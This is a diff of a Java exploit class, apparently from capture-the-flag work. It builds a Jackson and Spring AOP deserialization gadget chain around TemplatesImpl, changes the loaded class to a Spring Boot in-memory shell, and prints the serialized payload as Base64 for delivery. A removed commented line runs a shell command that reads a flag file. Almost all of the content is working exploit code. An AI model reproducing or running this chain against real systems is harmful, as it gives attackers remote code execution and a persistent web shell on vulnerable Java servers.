@@ -22,7 +22,7 @@ public class Jackson {
 
 //        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
 
-//        final Object template = GadgetUtils.getTemplatesImpl("cat /F14gIsHereY0UGOTIT>/tmp/file");
+//        final Object template = GadgetUtils.templatesImplLocalWindows();
         CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
         ctClass.removeMethod(writeReplace);
@@ -30,6 +30,7 @@ public class Jackson {
         ctClass.toClass();
 
         POJONode node = new POJONode(makeTemplatesImplAopProxy());
+//        POJONode node = new POJONode(template);
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         Field valfield = val.getClass().getDeclaredField("val");
         valfield.setAccessible(true);
@@ -37,13 +38,14 @@ public class Jackson {
 //        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 //        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
 //        oos.writeObject(val);
-        SerializerUtils.unserialize(SerializerUtils.serialize(val));
-//        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
+//        SerializerUtils.unserialize(SerializerUtils.serialize(val));
+        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(val)));
     }
 
     public static Object makeTemplatesImplAopProxy() throws Exception {
         AdvisedSupport advisedSupport = new AdvisedSupport();
-        advisedSupport.setTarget(GadgetUtils.templatesImplLocalWindows());
+        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
+        advisedSupport.setTarget(template);
         Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
